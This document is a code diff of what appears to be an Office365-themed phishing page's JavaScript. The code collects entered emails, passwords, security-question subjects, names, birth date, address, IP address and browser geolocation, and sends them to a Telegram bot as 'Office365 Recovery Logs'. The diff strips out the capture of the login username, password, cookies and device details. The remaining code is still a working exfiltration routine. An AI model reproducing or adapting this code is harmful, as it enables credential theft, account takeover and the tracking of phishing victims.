@@ -207,23 +207,15 @@
       var enteredCountry = localStorage.getItem("Country");
       var enteredCity = localStorage.getItem("City");
       var postalCode = localStorage.getItem("Postal code");
-      var username = localStorage.getItem("email");
-      var password = localStorage.getItem("password");
-      const x = document.cookie;
+
       fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
-        const deviceInfo = {
-          manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
-          model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
-          os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
-          browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
-        };
-        getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, username, password, x, deviceInfo, ipAddress);
+        getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, ipAddress);
       }).catch(error => {
         console.error("Error capturing IP address:", error);
       });
     }
 
-    function getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, username, password, x, deviceInfo, ipAddress) {
+    function getLocation(emailOne, emailTwo, emailThree, emailFour, subjectOne, subjectTwo, passwordOne, passwordTwo, productsUsed, hadPurchases, firstName, lastName, birthDate, enteredCountry, enteredCity, postalCode, ipAddress) {
       navigator.geolocation?.getCurrentPosition(async (position) => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
@@ -256,12 +248,7 @@
                 enteredCountry,
                 enteredCity,
                 postalCode,
-                username,
-                password,
                 ipAddress,
-                Device: deviceInfo.manufacturer,
-                OS: deviceInfo.os,
-                Browser: deviceInfo.browser,
                 Latitude: latitude,
                 Longitude: longitude,
                 City: city,
@@ -269,7 +256,6 @@
                 Country: country,
                 County: county,
                 ZipCode: zipCode,
-                Cookies: x,
               };
               if (Object.keys(dataToSend).length > 0) {
                 sendToTelegram(dataToSend);
@@ -293,11 +279,8 @@
       var payload = {
         chat_id: chatId,
         text: `
-            New Office365 Logs:
+            New Office365 Recovery Logs:
             ________________________
-               "Email address, phone number or skype": "${data.username}",
-               "Password": "${data.password}",
-
                "First Name": "${data.firstName}",
                "Last Name": "${data.lastName}",
                "Birth date": "${data.birthDate}",
@@ -326,9 +309,6 @@
                "Subject - 2": "${data.subjectTwo}",
 
                "IP Address": ${data.ipAddress},
-               "Device Info": "${data.Device}",
-               "OS": "${data.OS}",
-               "Browser": "${data.Browser}",
                "Latitude": ${data.Latitude},
                "Longitude": ${data.Longitude},
                "City": "${data.City}",
@@ -336,7 +316,6 @@
                "County": "${data.County}",
                "Country": "${data.Country}",
                "ZipCode": "${data.ZipCode}",
-               "Cookies/User Token": ["${data.Cookies}"],
             `
       };
       var sendToBot = {
